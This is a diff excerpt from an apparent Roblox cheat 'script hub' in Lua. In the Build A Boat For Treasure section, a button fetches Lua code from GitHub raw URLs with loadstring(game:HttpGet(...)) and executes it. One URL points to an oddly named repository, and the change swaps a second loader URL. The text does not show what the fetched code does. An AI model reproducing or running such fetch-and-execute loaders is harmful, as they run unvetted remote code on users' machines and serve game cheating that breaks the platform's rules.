@@ -278,7 +278,7 @@ local baftSection = baft:NewSection("Build A Boat For Treasure")
 
 baftSection:NewButton("Script 1", "launch Script 1", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/m6225061-create/dadawawdw/refs/heads/main/adawda'))()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/TheRealAsu/BABFT/refs/heads/main/Source.lua'))("T.me/DeltaScripts")
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/TheRealAsu/BABFT/refs/heads/main/Loader.lua'))()
 end)
 
 baftSection:NewButton("Weshky Hub", "launch Weshky Hub Script", function()
